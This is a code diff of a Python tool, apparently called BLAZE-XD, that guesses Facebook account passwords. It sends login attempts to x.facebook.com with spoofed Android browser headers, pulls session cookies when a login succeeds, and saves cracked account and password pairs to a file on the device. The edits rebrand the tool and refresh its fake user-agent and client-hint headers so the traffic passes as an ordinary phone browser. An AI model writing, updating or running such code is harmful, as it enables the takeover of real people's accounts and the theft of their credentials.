@@ -1,4 +1,5 @@
 
+
 #-----
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
 from random import randint
@@ -810,27 +811,30 @@ def rcrack(uid,pwx,tl):
 			"email":uid,
 			"pass":ps,
 			"login":"Log In"}
-			hheader_freefb = {		
+               
+			header_freefb = {
     'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-    'dpr': '1.8000000715255737',
-    'referer': 'https://x.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'dark',
+    'cache-control': 'max-age=0',
+    'dpr': '2.34375',
+    'referer': 'https://x.facebook.com/bookmarks/',
+    'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.2"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"M2006C3LI"',
+    'sec-ch-ua-model': '"Redmi Note 8"',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'same-origin',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',
-}
+}                       
+                
 			if 'c_user' in log_cookies:
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
@@ -848,7 +852,7 @@ def rcrack(uid,pwx,tl):
 			else:
 				continue
 		loop+=1
-		sys.stdout.write('\r\033[1;97m[AFTAB-XD] [%s/%s] OK:- %s CP:- %s \r'%(loop,tl,len(oks),len(cps))),
+		sys.stdout.write('\r\033[1;97m[BLAZE-XD] [%s/%s] OK:- %s CP:- %s \r'%(loop,tl,len(oks),len(cps))),
 		sys.stdout.flush()
 	except:
 		pass
@@ -1018,7 +1022,7 @@ def method():
         sys.stdout.write('\r \033[1;97m[\033[1;97mBLAZE-XD\033[1;97m]\033[1;97m {}|{} \033[1;92m|{} \033[1;91m|{}       \r'.format(str(loop), str(len(accounts)), str(len(okacc)) ,str(len(cpacc))))
         sys.stdout.flush()
         for pword in totalpass:              
-            heads = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36"
+            heads = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
             header = {"Content-Type": "application/x-www-form-accencoded","Host": "x.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
             pword = pword.replace("first", first).replace("last", last)
             pword = pword.lower()
@@ -1028,7 +1032,7 @@ def method():
             if 'session_key' in response.text:
                 okacc.append(acc)
                 print('\r\033[1;92m [BLAZE-Ok] '+acc+' | '+pword+'')
-                open('/sdcard/AFTAB-Ok.txt','a').write(f'{acc}|{pword}\n ')
+                open('/sdcard/BLAZE-Ok.txt','a').write(f'{acc}|{pword}\n ')
                 if c=='y':
                     try:
                            q = json.loads(response.text)
